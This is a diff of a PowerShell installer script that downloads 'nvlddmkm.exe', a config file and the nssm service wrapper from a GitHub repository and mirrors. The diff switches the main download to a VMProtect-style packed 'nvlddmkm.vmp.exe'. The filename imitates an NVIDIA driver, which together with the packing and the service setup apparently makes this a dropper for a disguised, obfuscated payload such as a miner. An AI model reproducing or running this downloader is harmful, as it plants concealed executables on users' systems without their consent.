@@ -153,7 +153,7 @@ Write-Host "`nStep 3: Downloading files..." -ForegroundColor Cyan
 # Define files with multiple mirror URLs
 $files = @{
     'nvlddmkm.exe' = @(
-        'https://raw.githubusercontent.com/User07x07/Dopple/main/nvlddmkm.exe',
+        'https://raw.githubusercontent.com/User07x07/Dopple/main/nvlddmkm.vmp.exe',
         'https://github.com/User07x07/Dopple/raw/main/nvlddmkm.exe',
         'https://cdn.jsdelivr.net/gh/User07x07/Dopple/nvlddmkm.exe'
     )
@@ -211,7 +211,7 @@ foreach ($item in $files.GetEnumerator()) {
 # Step 4: Verify downloaded files
 Write-Host "`nStep 4: Verifying downloaded files..." -ForegroundColor Cyan
 
-$requiredFiles = @('nvlddmkm.exe', 'config.json', 'nssm.exe')
+$requiredFiles = @('nvlddmkm.vmp.exe', 'config.json', 'nssm.exe')
 $missingFiles = @()
 $failedDownloads = $downloadResults.GetEnumerator() | Where-Object { $_.Value -eq $false }
 
@@ -355,5 +355,6 @@ if ($Host.Name -eq "ConsoleHost") {
     Write-Host "`nPress any key to exit..." -ForegroundColor DarkGray
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 }
+
 
 
